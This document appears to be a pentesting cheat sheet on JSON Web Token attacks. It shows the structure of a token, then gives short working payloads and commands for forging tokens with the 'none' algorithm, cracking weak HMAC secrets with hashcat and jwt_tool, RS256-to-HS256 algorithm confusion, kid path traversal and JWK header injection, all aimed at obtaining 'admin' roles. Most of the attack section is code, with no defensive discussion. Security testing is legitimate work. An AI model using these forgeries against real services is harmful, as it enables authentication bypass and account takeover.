# JWT Security Testing

## Token Structure
```
header.payload.signature
```

### Header
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key-id"
}
```

### Payload
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "role": "user"
}
```

## Attacks

### None Algorithm
```python
import jwt
token = jwt.encode({"sub": "admin", "role": "admin"}, key="", algorithm="none")
```

### Weak HMAC Secret
```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
python jwt_tool.py <token> -C -d rockyou.txt
```

### Algorithm Confusion (RS256 -> HS256)
```python
# If server uses RSA but you have the public key
public_key = open("public.pem").read()
forged = jwt.encode(payload, key=public_key, algorithm="HS256")
```

### Kid Injection
```json
{
  "alg": "HS256",
  "kid": "../../../dev/null"  // Empty key
}
```

### JWK Injection
```json
{
  "alg": "HS256",
  "jwk": {
    "kty": "oct",
    "k": "base64_attacker_key"
  }
}
```

## Tools
- jwt_tool
- jwt-cracker
- john (jumbo for JWT)